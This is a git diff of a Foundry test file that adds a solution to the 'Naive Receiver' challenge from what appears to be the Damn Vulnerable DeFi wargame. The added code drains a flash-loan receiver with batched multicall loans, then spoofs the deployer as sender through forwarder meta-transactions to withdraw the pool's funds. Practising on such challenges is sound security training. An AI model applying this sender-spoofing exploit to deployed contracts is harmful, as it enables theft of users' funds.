@@ -5,9 +5,11 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
+import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
 contract NaiveReceiverChallenge is Test {
+    using ECDSA for bytes32;
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
     address player;
@@ -48,7 +50,7 @@ contract NaiveReceiverChallenge is Test {
         receiver = new FlashLoanReceiver(address(pool));
         weth.deposit{value: WETH_IN_RECEIVER}();
         weth.transfer(address(receiver), WETH_IN_RECEIVER);
-
+        
         vm.stopPrank();
     }
 
@@ -73,11 +75,72 @@ contract NaiveReceiverChallenge is Test {
         );
     }
 
+
+    function multicallSelector(bytes memory callData,address from) public returns(bytes memory) {
+        
+        bytes memory metaTxData = bytes.concat(callData, bytes20(from));
+
+        bytes[] memory depositMulticallArguments = new bytes[](10);
+        for(uint i=0;i<10;i++){
+            depositMulticallArguments[i] = metaTxData;
+        }
+        return abi.encodeWithSelector(pool.multicall.selector, depositMulticallArguments);
+    }
+    function multicallSelector2(bytes memory callData,address from) public returns(bytes memory) {
+        
+        bytes memory metaTxData = bytes.concat(callData, bytes20(from));
+
+        bytes[] memory depositMulticallArguments = new bytes[](1);
+        depositMulticallArguments[0] = metaTxData;
+        return abi.encodeWithSelector(pool.multicall.selector, depositMulticallArguments);
+    }
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+
+        bytes memory callData1 = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth,1000 ether,"");
+        // multicall
+        bytes memory multicallSelectorFor1000ETH = multicallSelector(callData1,player);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from : player,
+            target : address(pool),
+            value : 0,
+            gas : gasleft(),
+            nonce : 0,
+            data : multicallSelectorFor1000ETH,
+            deadline : block.timestamp + 1 days
+        });
+
+        bytes32 requestHash = forwarder.getDataHash(request);
+        // requestHash = requestHash._hashTypedData();
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        bool success = forwarder.execute{value: 0}(request, signature);
+        console.log(success);
+        console.log(pool.deposits(deployer));
         
+
+        bytes memory callData2 = abi.encodeWithSelector(pool.withdraw.selector,1010 ether,recovery);
+        bytes memory multicallSelectorFor1010ETH = multicallSelector2(callData2,deployer);
+        
+         request = BasicForwarder.Request({
+            from : player,
+            target : address(pool),
+            value : 0,
+            gas : gasleft(),
+            nonce : 1,
+            data : multicallSelectorFor1010ETH,
+            deadline : block.timestamp + 1 days
+        });
+         requestHash = forwarder.getDataHash(request);
+        ( v,  r,  s) = vm.sign(playerPk, requestHash);
+        signature = abi.encodePacked(r, s, v);
+        success = forwarder.execute{value: 0}(request, signature);
+        console.log(recovery);
+        console.log(weth.balanceOf(recovery));
+        console.log(success);
     }
 
     /**
